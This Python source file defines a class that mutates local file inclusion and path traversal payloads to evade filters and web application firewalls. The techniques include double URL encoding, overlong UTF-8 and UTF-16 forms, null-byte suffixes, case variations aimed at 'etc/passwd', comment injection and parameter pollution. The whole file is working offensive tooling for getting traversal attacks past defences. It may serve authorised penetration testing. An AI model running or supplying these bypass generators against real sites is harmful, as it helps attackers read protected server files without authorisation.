import urllib.parse
import re


class EncodingBypass:
    """Advanced encoding and bypass techniques for LFI exploitation"""

    @staticmethod
    def double_url_encode(payload):
        """Apply double URL encoding to bypass filters"""
        # First encoding
        first_encode = urllib.parse.quote(payload, safe="")
        # Second encoding
        return urllib.parse.quote(first_encode, safe="")

    @staticmethod
    def unicode_encode(payload):
        """Apply Unicode encoding variations"""
        encoded_variants = []

        # Unicode normalization bypass
        unicode_payload = payload.replace("../", "\u002e\u002e\u002f")
        encoded_variants.append(unicode_payload)

        # UTF-8 overlong encoding
        overlong_payload = payload.replace("../", "%c0%ae%c0%ae%c0%af")
        encoded_variants.append(overlong_payload)

        # UTF-16 encoding
        utf16_payload = payload.replace("../", "%u002e%u002e%u002f")
        encoded_variants.append(utf16_payload)

        return encoded_variants

    @staticmethod
    def case_variation(payload):
        """Apply case variation bypasses"""
        variations = []

        # Mixed case for file extensions and keywords
        mixed_case = payload
        mixed_case = re.sub(r"\.php", ".PhP", mixed_case, flags=re.IGNORECASE)
        mixed_case = re.sub(r"\.txt", ".TxT", mixed_case, flags=re.IGNORECASE)
        mixed_case = re.sub(r"etc", "EtC", mixed_case, flags=re.IGNORECASE)
        mixed_case = re.sub(r"passwd", "PaSSwd", mixed_case, flags=re.IGNORECASE)
        variations.append(mixed_case)

        # Uppercase variation
        upper_case = payload.upper()
        variations.append(upper_case)

        # Alternating case
        alternating = "".join(
            c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)
        )
        variations.append(alternating)

        return variations

    @staticmethod
    def path_traversal_variations(payload):
        """Generate various path traversal encoding variations"""
        variations = []

        # Standard variations
        variations.append(payload)

        # URL encoded
        variations.append(urllib.parse.quote(payload, safe=""))

        # Double URL encoded
        variations.append(EncodingBypass.double_url_encode(payload))

        # Hex encoded dots and slashes
        hex_payload = (
            payload.replace(".", "%2e").replace("/", "%2f").replace("\\", "%5c")
        )
        variations.append(hex_payload)

        # Mixed encoding
        mixed_payload = payload.replace("../", "%2e%2e%2f")
        variations.append(mixed_payload)

        # Alternative separators
        backslash_payload = payload.replace("/", "\\")
        variations.append(backslash_payload)

        # Null byte variations
        null_variations = [
            payload + "%00",
            payload + "%00.jpg",
            payload + "\x00",
            payload + "\x00.txt",
        ]
        variations.extend(null_variations)

        return variations

    @staticmethod
    def generate_all_variants(payload):
        """Generate all possible encoding variants of a payload"""
        all_variants = set()

        # Base payload
        all_variants.add(payload)

        # Path traversal variations
        traversal_variants = EncodingBypass.path_traversal_variations(payload)
        all_variants.update(traversal_variants)

        # Unicode variants
        unicode_variants = EncodingBypass.unicode_encode(payload)
        all_variants.update(unicode_variants)

        # Case variations
        case_variants = EncodingBypass.case_variation(payload)
        all_variants.update(case_variants)

        # Apply case variations to encoded payloads
        for variant in list(all_variants):
            case_vars = EncodingBypass.case_variation(variant)
            all_variants.update(case_vars)

        return list(all_variants)

    @staticmethod
    def waf_bypass_variants(payload):
        """Generate WAF-specific bypass variants"""
        waf_variants = []

        # Space variations
        space_variants = [
            payload.replace(" ", "%20"),
            payload.replace(" ", "+"),
            payload.replace(" ", "%09"),  # Tab
            payload.replace(" ", "%0a"),  # Newline
            payload.replace(" ", "%0d"),  # Carriage return
        ]
        waf_variants.extend(space_variants)

        # Comment injection
        comment_variants = [
            payload.replace("../", "..//**/"),
            payload.replace("../", "../#\n"),
            payload.replace("/", "//**/"),
        ]
        waf_variants.extend(comment_variants)

        # Parameter pollution
        pollution_variants = [
            payload + "&file=" + payload,
            payload + "?dummy=1&file=" + payload,
        ]
        waf_variants.extend(pollution_variants)

        # Length variation
        if len(payload) < 100:
            padded_payload = payload + "A" * (100 - len(payload))
            waf_variants.append(padded_payload)

        return waf_variants
